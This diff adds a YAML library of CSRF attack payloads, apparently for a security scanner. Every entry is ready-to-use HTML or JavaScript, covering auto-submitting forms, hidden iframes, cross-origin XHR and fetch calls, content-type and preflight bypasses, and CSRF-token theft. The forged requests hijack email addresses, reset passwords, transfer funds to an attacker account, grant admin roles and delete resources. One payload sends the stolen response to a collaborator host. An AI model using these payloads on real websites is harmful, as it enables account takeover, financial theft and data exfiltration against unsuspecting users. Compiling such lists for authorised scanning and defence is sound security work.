@@ -1,0 +1,258 @@
+defaults:
+  vuln_type: csrf
+  encoding: raw
+  source: ensphere
+
+payloads:
+  # ============================================================
+  # AUTO-SUBMITTING HTML FORMS
+  # ============================================================
+
+  - technique: form_auto_submit
+    injection_surface: form_body
+    evidence_type: status_diff
+    risk: 2
+    payload: "<html><body><form id=\"csrf\" method=\"POST\" action=\"TARGET_URL\"><input type=\"hidden\" name=\"PARAM\" value=\"VALUE\"/></form><script>document.getElementById('csrf').submit();</script></body></html>"
+    placeholders: [TARGET_URL, PARAM, VALUE]
+    notes: "Basic auto-submitting form. On page load the form fires a POST to the target with attacker-chosen parameters. Victim's browser attaches session cookies automatically."
+    tags: [basic, auto_submit, confirmation]
+
+  - technique: form_auto_submit
+    injection_surface: form_body
+    evidence_type: status_diff
+    risk: 2
+    payload: "<html><body><form id=\"csrf\" method=\"POST\" action=\"TARGET_URL\"><input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\"/><input type=\"hidden\" name=\"confirm\" value=\"1\"/></form><script>document.getElementById('csrf').submit();</script></body></html>"
+    placeholders: [TARGET_URL]
+    notes: "Email change CSRF. Overwrites the victim's email address with an attacker-controlled one, enabling account takeover via password reset."
+    tags: [email_change, account_takeover, auto_submit]
+
+  - technique: form_auto_submit
+    injection_surface: form_body
+    evidence_type: status_diff
+    risk: 3
+    payload: "<html><body><form id=\"csrf\" method=\"POST\" action=\"TARGET_URL\"><input type=\"hidden\" name=\"new_password\" value=\"Pwned123!\"/><input type=\"hidden\" name=\"confirm_password\" value=\"Pwned123!\"/></form><script>document.getElementById('csrf').submit();</script></body></html>"
+    placeholders: [TARGET_URL]
+    notes: "Password change CSRF. Resets the victim's password without requiring the current password. Full account takeover if endpoint does not validate the old password."
+    tags: [password_change, account_takeover, auto_submit]
+
+  - technique: form_auto_submit
+    injection_surface: form_body
+    evidence_type: status_diff
+    risk: 3
+    payload: "<html><body><form id=\"csrf\" method=\"POST\" action=\"TARGET_URL\"><input type=\"hidden\" name=\"to_account\" value=\"ATTACKER_ACCT\"/><input type=\"hidden\" name=\"amount\" value=\"10000\"/><input type=\"hidden\" name=\"currency\" value=\"USD\"/></form><script>document.getElementById('csrf').submit();</script></body></html>"
+    placeholders: [TARGET_URL, ATTACKER_ACCT]
+    notes: "Fund transfer CSRF. Initiates a money transfer from the victim's account to an attacker-controlled account. High-impact financial action."
+    tags: [fund_transfer, financial, auto_submit]
+
+  - technique: form_auto_submit
+    injection_surface: form_body
+    evidence_type: status_diff
+    risk: 2
+    payload: "<html><body><form id=\"csrf\" method=\"POST\" action=\"TARGET_URL\" enctype=\"multipart/form-data\"><input type=\"hidden\" name=\"PARAM\" value=\"VALUE\"/></form><script>document.getElementById('csrf').submit();</script></body></html>"
+    placeholders: [TARGET_URL, PARAM, VALUE]
+    notes: "Multipart form-data CSRF. Uses multipart encoding which some CSRF protections fail to validate because they only inspect application/x-www-form-urlencoded requests."
+    tags: [multipart, encoding_bypass, auto_submit]
+
+  - technique: form_auto_submit
+    injection_surface: form_body
+    evidence_type: status_diff
+    risk: 2
+    payload: "<html><body><form id=\"csrf\" method=\"POST\" action=\"TARGET_URL\"><input type=\"hidden\" name=\"role\" value=\"admin\"/><input type=\"hidden\" name=\"user_id\" value=\"VICTIM_ID\"/></form><script>document.getElementById('csrf').submit();</script></body></html>"
+    placeholders: [TARGET_URL, VICTIM_ID]
+    notes: "Privilege escalation CSRF. Changes the victim's role to admin or grants elevated permissions. Targets user management or role-assignment endpoints."
+    tags: [privilege_escalation, role_change, auto_submit]
+
+  - technique: form_auto_submit
+    injection_surface: form_body
+    evidence_type: redirect
+    risk: 2
+    payload: "<html><body><form id=\"csrf\" method=\"POST\" action=\"TARGET_URL\" target=\"hidden_iframe\"><input type=\"hidden\" name=\"PARAM\" value=\"VALUE\"/></form><iframe name=\"hidden_iframe\" style=\"display:none\"></iframe><script>document.getElementById('csrf').submit();</script></body></html>"
+    placeholders: [TARGET_URL, PARAM, VALUE]
+    notes: "Hidden iframe form submission. Posts to a hidden iframe so the victim stays on the attacker page and does not notice the navigation. Stealthier than direct form submit."
+    tags: [iframe, stealth, auto_submit]
+
+  # ============================================================
+  # XHR CROSS-ORIGIN
+  # ============================================================
+
+  - technique: xhr_cross_origin
+    injection_surface: form_body
+    evidence_type: status_diff
+    risk: 2
+    payload: "<html><body><script>var xhr=new XMLHttpRequest();xhr.open('POST','TARGET_URL',true);xhr.withCredentials=true;xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('PARAM=VALUE');</script></body></html>"
+    placeholders: [TARGET_URL, PARAM, VALUE]
+    notes: "XHR POST with withCredentials. Sends a cross-origin POST carrying session cookies. Works if the target has a permissive CORS policy or does not require a preflight for this content type."
+    tags: [xhr, withCredentials, cross_origin]
+
+  - technique: xhr_cross_origin
+    injection_surface: json_body
+    evidence_type: status_diff
+    risk: 3
+    payload: "<html><body><script>var xhr=new XMLHttpRequest();xhr.open('POST','TARGET_URL',true);xhr.withCredentials=true;xhr.setRequestHeader('Content-Type','text/plain');xhr.send('{\"PARAM\":\"VALUE\"}');</script></body></html>"
+    placeholders: [TARGET_URL, PARAM, VALUE]
+    notes: "XHR JSON body with text/plain content type. Bypasses CORS preflight because text/plain is a simple content type. If the server parses the body as JSON regardless of Content-Type, the attack succeeds."
+    tags: [xhr, json, content_type_bypass, text_plain]
+
+  - technique: xhr_cross_origin
+    injection_surface: json_body
+    evidence_type: status_diff
+    risk: 3
+    payload: "<html><body><script>var xhr=new XMLHttpRequest();xhr.open('PUT','TARGET_URL',true);xhr.withCredentials=true;xhr.setRequestHeader('Content-Type','text/plain');xhr.send('{\"email\":\"attacker@evil.com\"}');</script></body></html>"
+    placeholders: [TARGET_URL]
+    notes: "XHR PUT method with text/plain bypass. Targets REST APIs that accept PUT for updates. text/plain avoids preflight but server may still parse JSON body."
+    tags: [xhr, put_method, json, content_type_bypass]
+
+  - technique: xhr_cross_origin
+    injection_surface: form_body
+    evidence_type: status_diff
+    risk: 2
+    payload: "<html><body><script>var xhr=new XMLHttpRequest();xhr.open('DELETE','TARGET_URL/RESOURCE_ID',true);xhr.withCredentials=true;xhr.send();</script></body></html>"
+    placeholders: [TARGET_URL, RESOURCE_ID]
+    notes: "XHR DELETE CSRF. Sends a cross-origin DELETE request. If the server has Access-Control-Allow-Credentials: true with a permissive origin, the resource is deleted under the victim's session."
+    tags: [xhr, delete_method, cross_origin, destructive]
+
+  # ============================================================
+  # FETCH CROSS-ORIGIN
+  # ============================================================
+
+  - technique: fetch_cross_origin
+    injection_surface: form_body
+    evidence_type: status_diff
+    risk: 2
+    payload: "<html><body><script>fetch('TARGET_URL',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'PARAM=VALUE'});</script></body></html>"
+    placeholders: [TARGET_URL, PARAM, VALUE]
+    notes: "Fetch API POST with credentials:include. Modern alternative to XHR. Sends cookies cross-origin. Simple content type avoids preflight."
+    tags: [fetch, credentials_include, cross_origin]
+
+  - technique: fetch_cross_origin
+    injection_surface: json_body
+    evidence_type: status_diff
+    risk: 3
+    payload: "<html><body><script>fetch('TARGET_URL',{method:'POST',credentials:'include',headers:{'Content-Type':'text/plain'},body:'{\"PARAM\":\"VALUE\"}'});</script></body></html>"
+    placeholders: [TARGET_URL, PARAM, VALUE]
+    notes: "Fetch API JSON CSRF with text/plain bypass. Uses text/plain to skip CORS preflight while sending a JSON body. Exploits servers that parse body content irrespective of Content-Type header."
+    tags: [fetch, json, content_type_bypass, text_plain]
+
+  - technique: fetch_cross_origin
+    injection_surface: json_body
+    evidence_type: status_diff
+    risk: 3
+    payload: "<html><body><script>fetch('TARGET_URL',{method:'POST',credentials:'include',headers:{'Content-Type':'text/plain'},body:'eyJhY3Rpb24iOiJkZWxldGUiLCJ1c2VyIjoiYWRtaW4ifQ=='});</script></body></html>"
+    placeholders: [TARGET_URL]
+    notes: "Fetch with base64-encoded JSON payload via text/plain. Targets endpoints that base64-decode the request body before parsing JSON. Dodges WAF inspection of plaintext JSON."
+    tags: [fetch, base64, content_type_bypass, obfuscation]
+
+  - technique: fetch_cross_origin
+    injection_surface: form_body
+    evidence_type: callback_hit
+    risk: 3
+    payload: "<html><body><script>fetch('TARGET_URL',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'PARAM=VALUE'}).then(r=>r.text()).then(t=>{fetch('https://COLLAB_DOMAIN/exfil?data='+btoa(t))});</script></body></html>"
+    placeholders: [TARGET_URL, PARAM, VALUE, COLLAB_DOMAIN]
+    notes: "Fetch CSRF with response exfiltration. After forging the request, reads the response and sends it to a collaborator server. Only works if CORS allows reading the response (Access-Control-Allow-Origin with credentials)."
+    tags: [fetch, exfiltration, callback, cross_origin]
+
+  # ============================================================
+  # IMAGE / IFRAME TAG CSRF (GET-BASED)
+  # ============================================================
+
+  - technique: image_tag
+    injection_surface: form_body
+    evidence_type: status_diff
+    risk: 2
+    payload: "<html><body><img src=\"TARGET_URL?PARAM=VALUE\" style=\"display:none\"/></body></html>"
+    placeholders: [TARGET_URL, PARAM, VALUE]
+    notes: "Image tag GET CSRF. The browser sends a GET request with cookies to load the image. Exploits state-changing GET endpoints (logout, delete, toggle). No JavaScript required."
+    tags: [img, get_method, no_js, simple]
+
+  - technique: image_tag
+    injection_surface: form_body
+    evidence_type: status_diff
+    risk: 2
+    payload: "<html><body><img src=\"TARGET_URL?action=delete&id=RESOURCE_ID\" style=\"display:none\" onerror=\"this.src='TARGET_URL?action=delete&id=RESOURCE_ID&retry=1'\"/></body></html>"
+    placeholders: [TARGET_URL, RESOURCE_ID]
+    notes: "Image tag CSRF with retry on error. Uses onerror handler to retry the request with a modified parameter if the first attempt fails. Targets GET-based destructive actions."
+    tags: [img, get_method, retry, destructive]
+
+  - technique: image_tag
+    injection_surface: form_body
+    evidence_type: status_diff
+    risk: 2
+    payload: "<html><body><iframe src=\"TARGET_URL?PARAM=VALUE\" style=\"display:none\"></iframe></body></html>"
+    placeholders: [TARGET_URL, PARAM, VALUE]
+    notes: "Hidden iframe GET CSRF. Loads the target URL in an invisible iframe, triggering the GET request with the victim's cookies. Works for endpoints that return non-image content types."
+    tags: [iframe, get_method, stealth]
+
+  - technique: image_tag
+    injection_surface: form_body
+    evidence_type: status_diff
+    risk: 2
+    payload: "<html><body><script>for(var i=1;i<=5;i++){var img=new Image();img.src='TARGET_URL?action=delete&id='+i;}</script></body></html>"
+    placeholders: [TARGET_URL]
+    notes: "Multi-target image CSRF. Creates multiple image objects in a loop, each firing a separate GET request. Deletes or modifies multiple resources in a single page load."
+    tags: [img, get_method, multi_target, bulk]
+
+  # ============================================================
+  # JSON CONTENT-TYPE BYPASS
+  # ============================================================
+
+  - technique: form_auto_submit
+    injection_surface: json_body
+    evidence_type: status_diff
+    risk: 3
+    payload: "<html><body><form id=\"csrf\" method=\"POST\" action=\"TARGET_URL\" enctype=\"text/plain\"><input name='{\"PARAM\":\"VALUE\",\"ignore_me\":\"' value='\"}' type=\"hidden\"/></form><script>document.getElementById('csrf').submit();</script></body></html>"
+    placeholders: [TARGET_URL, PARAM, VALUE]
+    notes: "JSON CSRF via form with text/plain enctype. The form constructs a body like {\"PARAM\":\"VALUE\",\"ignore_me\":\"=}. If the server parses this as JSON (lenient parser), the PARAM key is set. Classic content-type bypass."
+    tags: [json, text_plain, form_trick, content_type_bypass]
+
+  - technique: fetch_cross_origin
+    injection_surface: json_body
+    evidence_type: status_diff
+    risk: 3
+    payload: "<html><body><script>var blob=new Blob(['{\"PARAM\":\"VALUE\"}'],{type:'application/json'});fetch('TARGET_URL',{method:'POST',credentials:'include',body:blob});</script></body></html>"
+    placeholders: [TARGET_URL, PARAM, VALUE]
+    notes: "Fetch with Blob to send application/json without preflight in some browser configurations. The Blob sets Content-Type but some older browsers do not trigger preflight for Blob-based requests."
+    tags: [fetch, blob, json, content_type_bypass]
+
+  # ============================================================
+  # MULTIPART BOUNDARY TRICK
+  # ============================================================
+
+  - technique: xhr_cross_origin
+    injection_surface: form_body
+    evidence_type: status_diff
+    risk: 3
+    payload: "<html><body><script>var xhr=new XMLHttpRequest();xhr.open('POST','TARGET_URL',true);xhr.withCredentials=true;xhr.setRequestHeader('Content-Type','multipart/form-data; boundary=----WebKitFormBoundary');var body='------WebKitFormBoundary\\r\\nContent-Disposition: form-data; name=\"PARAM\"\\r\\n\\r\\nVALUE\\r\\n------WebKitFormBoundary--';xhr.send(body);</script></body></html>"
+    placeholders: [TARGET_URL, PARAM, VALUE]
+    notes: "XHR with manually crafted multipart boundary. Some CSRF protections only validate tokens in urlencoded bodies but not in multipart. The custom boundary trick can also bypass WAFs that do not parse multipart."
+    tags: [xhr, multipart, boundary_trick, protection_bypass]
+
+  - technique: form_auto_submit
+    injection_surface: form_body
+    evidence_type: status_diff
+    risk: 2
+    payload: "<html><body><form id=\"csrf\" method=\"POST\" action=\"TARGET_URL\" enctype=\"multipart/form-data\"><input type=\"hidden\" name=\"action\" value=\"update_profile\"/><input type=\"hidden\" name=\"admin\" value=\"true\"/><input type=\"file\" name=\"avatar\" style=\"display:none\"/></form><script>document.getElementById('csrf').submit();</script></body></html>"
+    placeholders: [TARGET_URL]
+    notes: "Multipart form with file field. The presence of a file input forces multipart encoding. Some server-side frameworks route multipart requests through different parsing logic that skips CSRF validation."
+    tags: [multipart, file_upload, protection_bypass, auto_submit]
+
+  # ============================================================
+  # ADVANCED / CHAINED TECHNIQUES
+  # ============================================================
+
+  - technique: form_auto_submit
+    injection_surface: form_body
+    evidence_type: dom_execution
+    risk: 3
+    payload: "<html><body><form id=\"csrf1\" method=\"POST\" action=\"TARGET_URL_1\" target=\"frame1\"><input type=\"hidden\" name=\"PARAM1\" value=\"VALUE1\"/></form><form id=\"csrf2\" method=\"POST\" action=\"TARGET_URL_2\" target=\"frame2\"><input type=\"hidden\" name=\"PARAM2\" value=\"VALUE2\"/></form><iframe name=\"frame1\" style=\"display:none\"></iframe><iframe name=\"frame2\" style=\"display:none\"></iframe><script>document.getElementById('csrf1').submit();setTimeout(function(){document.getElementById('csrf2').submit();},2000);</script></body></html>"
+    placeholders: [TARGET_URL_1, PARAM1, VALUE1, TARGET_URL_2, PARAM2, VALUE2]
+    notes: "Chained CSRF. Submits two forms sequentially with a delay. First request sets up a precondition (e.g., enable a feature), second request exploits it (e.g., change password). Each targets a hidden iframe to remain stealthy."
+    tags: [chained, multi_step, sequential, auto_submit]
+
+  - technique: fetch_cross_origin
+    injection_surface: json_body
+    evidence_type: status_diff
+    risk: 3
+    payload: "<html><body><script>fetch('TARGET_URL/api/token',{credentials:'include'}).then(r=>r.json()).then(d=>{fetch('TARGET_URL/api/action',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json','X-CSRF-Token':d.token},body:'{\"PARAM\":\"VALUE\"}'})});</script></body></html>"
+    placeholders: [TARGET_URL, PARAM, VALUE]
+    notes: "CSRF token bypass via token endpoint. First fetches a valid CSRF token from a JSON endpoint, then uses it in the forged request. Only works if the token endpoint is accessible cross-origin (permissive CORS)."
+    tags: [token_bypass, chained, fetch, cors_misconfiguration]
